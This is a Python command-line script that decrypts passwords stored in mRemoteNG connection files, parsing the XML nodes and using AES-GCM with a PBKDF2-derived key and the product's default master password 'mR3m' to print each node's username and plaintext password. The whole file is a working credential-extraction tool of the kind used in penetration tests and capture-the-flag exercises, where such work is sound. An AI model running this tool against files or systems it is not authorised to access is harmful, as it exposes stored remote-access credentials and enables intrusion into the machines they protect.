import hashlib
import base64
from Cryptodome.Cipher import AES
import argparse

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    
def readXmlFile(fileName):
    try:
        xmlfile = open(fileName).readlines()
        print(bcolors.OKBLUE + "[+] Extracting information from {fileName}...".format(fileName=fileName) + bcolors.ENDC)
        return xmlfile
    except:
        print(bcolors.FAIL + "[!] {fileName} could not be found!".format(fileName=fileName) + bcolors.ENDC)


def getNodes(data):
    nodes = []
    for x in data:
        if "Node Name" in x:
            nodes.append(x)
    print(bcolors.OKGREEN + "[+] Found {} nodes!".format(len(nodes)) + bcolors.ENDC)
    return nodes

def decryptPassword(encrypted_password, master_password):
    master = master_password.encode()
    encrypted_data = encrypted_password.strip()
    encrypted_data = base64.b64decode(encrypted_data)
    salt = encrypted_data[:16]
    associated_data = encrypted_data[:16]
    nonce = encrypted_data[16:32]
    ciphertext = encrypted_data[32:-16]
    tag = encrypted_data[-16:]
    key = hashlib.pbkdf2_hmac("sha1", master, salt, 1000, dklen=32)
    cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
    cipher.update(associated_data)
    plaintext = cipher.decrypt_and_verify(ciphertext, tag)
    return plaintext.decode()
    
def getCredentials(nodes, master_password):
    print(bcolors.OKBLUE + "[+] Extracting data from nodes..." + bcolors.ENDC)
    count = 1
    for x in nodes:
        print(bcolors.OKGREEN + "[+] Extracted data from node #{}".format(count) + bcolors.ENDC)
        data = x.strip().split(" ")
        for x in data:
            if "Name=" in x:
                x = x.replace("Name=","")
                x = x.replace('"','')
                print("    Node name: {}".format(x))
            if "Id=" in x:
                x = x.replace("Id=","")
                x = x.replace('"','')
                print("    Id: {}".format(x))
            if "Username=" in x and ("VNCProxyUsername" not in x) and ("RDGatewayUsername" not in x) and ("InheritUsername" not in x) and ("IInheritRDGatewayUsername" not in x):
                x = x.replace("Username=","")
                x = x.replace('"','')
                print("    Username: {}".format(x))
            if "Password=" in x and ("VNCProxyPassword" not in x) and ("RDGatewayPassword" not in x) and ("InheritPassword" not in x) and ("IInheritRDGatewayPassword" not in x):
                x = x.replace("Password=","")
                x = x.replace('"','')
                print("    Password: {}".format(decryptPassword(x,master_password)))
        count += 1
                    
def logic(fileName, password):
    data = readXmlFile(fileName)
    nodes = getNodes(data)
    if len(nodes) == 0:
        return
    else:
        getCredentials(nodes, password)
            
if __name__ == '__main__':
    parser = argparse.ArgumentParser(description="Decrypt mRemoteNG passwords.")
    parser.add_argument("-f", "--file", help="name of file containing mRemoteNG password")
    parser.add_argument("-p", "--password", help="Custom password", default="mR3m")
    args = parser.parse_args()
    logic(args.file, args.password)